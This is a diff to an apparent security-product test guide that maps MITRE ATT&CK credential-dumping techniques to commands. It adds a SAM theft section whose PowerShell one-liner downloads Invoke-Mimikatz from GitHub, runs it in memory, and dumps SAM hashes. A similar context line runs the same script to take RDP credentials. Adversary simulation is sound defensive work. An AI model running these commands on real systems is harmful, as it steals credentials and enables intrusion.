@@ -68,6 +68,13 @@ Recently was added to Mimikatz, the assumption is that the target commputer conn
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "ts::mstsc"`
 
+### Security Account Manager credentials theft
+Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.
+Enumerating the SAM database requires SYSTEM level access - you need to execute powershell as administrator - the mimikatz command already tries to elevate to system.
+https://attack.mitre.org/techniques/T1003/002/
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "token::elevate lsadump::sam"`
+
 ## OS Credential Dumping: LSASS Memory
 Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.
 As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.
